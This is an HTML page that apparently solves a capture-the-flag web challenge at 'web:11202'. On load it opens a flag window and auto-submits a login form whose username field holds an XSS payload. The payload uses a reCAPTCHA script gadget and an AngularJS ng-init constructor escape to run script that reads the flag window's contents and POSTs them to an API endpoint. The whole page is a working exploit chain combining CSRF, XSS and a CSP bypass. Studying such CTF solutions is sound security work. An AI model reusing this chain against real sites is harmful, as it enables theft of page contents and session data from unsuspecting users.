<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Exploit</title>
</head>
<body>
    <h1>Exploit Running...</h1>
    <p>Step 1: Opening flag window...</p>
    <p>Step 2: Logging in with payload...</p>

    <!-- Form for Login -->
    <form id="loginForm" action="http://web:11202/login" method="POST">
        <input type="hidden" name="username" value="<script src=https://www.google.com/recaptcha/about/js/main.min.js></script><d ng-init=&quot;[].pop.constructor('fetch(`/api/flag/`,{{method:`POST`,body:`content=`+open(``,`x`).document.body.innerHTML}})')()&quot;>{request.session}">
        <input type="hidden" name="password" value="testtest">
    </form>

    <script>
        // Step 1: Open the flag window named 'x'
        try {
            var w = open("http://web:11202/flag", "x");
        } catch(e) {
            console.error("Blocked popup?", e);
        }

        // Step 2: Login
        window.onload = function() {
            // Submit the login form immediately
            document.getElementById('loginForm').submit();
        };
    </script>
</body>
</html>
